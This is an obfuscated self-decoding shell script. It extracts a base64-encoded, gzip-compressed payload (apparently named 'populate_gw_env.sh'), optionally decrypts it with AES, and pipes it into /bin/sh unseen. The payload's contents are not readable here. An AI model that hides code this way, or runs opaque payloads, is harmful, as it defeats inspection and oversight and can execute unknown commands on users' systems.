#!/usr/bin/env sh
# Self-decoding shell script (gzip+base64, optional AES-256-CBC via OpenSSL)
# If encrypted: set OBF_PASSPHRASE env or you will be prompted interactively.

set -eu

need() {
  command -v "$1" >/dev/null 2>&1
}

dec_b64() {
  # Decode base64 from stdin to stdout using available tools
  if need base64; then base64 -d 2>/dev/null || base64 --decode; return; fi
  if need openssl; then openssl base64 -d; return; fi
  if need python3; then python3 - <<'PY'
import sys, base64
sys.stdout.buffer.write(base64.b64decode(sys.stdin.buffer.read()))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, base64
sys.stdout.write(base64.b64decode(sys.stdin.read()))
PY
  return; fi
  if need perl; then perl -MMIME::Base64 -ne 'print decode_base64($_)'; return; fi
  if need busybox; then busybox base64 -d; return; fi
  echo "No base64 decoder found." >&2; exit 1
}

dec_gzip() {
  # Decompress gzip from stdin to stdout
  if need gzip; then gzip -dc; return; fi
  if need busybox; then busybox gzip -dc; return; fi
  # Python fallback using zlib
  if need python3; then python3 - <<'PY'
import sys, zlib
sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, zlib
sys.stdout.write(zlib.decompress(sys.stdin.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  echo "No gzip decompressor found." >&2; exit 1
}

dec_aes() {
  # Decrypt AES-256-CBC with OpenSSL from stdin to stdout using OBF_PASSPHRASE
  if ! need openssl; then
    echo "OpenSSL not available for AES decryption." >&2; exit 1
  fi
  pass="${OBF_PASSPHRASE:-}"
  if [ -z "$pass" ]; then
    printf "Enter passphrase: " >&2
    stty -echo 2>/dev/null || true
    IFS= read -r pass || true
    stty echo 2>/dev/null || true
    echo >&2
  fi
  # pbkdf2 because the obfuscator used it
  OPENSSL_PASS="pass:$pass" exec openssl enc -d -aes-256-cbc -pbkdf2 -pass "$OPENSSL_PASS"
}

# Metadata injected by obfuscator
OBF_ENCRYPTED="0"

# Payload below between markers
PAYLOAD_B64_START="__OBF_B64_PAYLOAD_START__"
PAYLOAD_B64_END="__OBF_B64_PAYLOAD_END__"

# Extract the base64 payload lines
extract_payload() {
  awk "/$PAYLOAD_B64_START/{flag=1;next}/$PAYLOAD_B64_END/{flag=0}flag" "$0"
}

run() {
  if [ "$OBF_ENCRYPTED" = "1" ]; then
    extract_payload | dec_b64 | dec_aes | dec_gzip | /bin/sh -s -- "$@"
  else
    extract_payload | dec_b64 | dec_gzip | /bin/sh -s -- "$@"
  fi
}

run "$@"
exit 0

__OBF_B64_PAYLOAD_START__
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
AAA=
__OBF_B64_PAYLOAD_END__
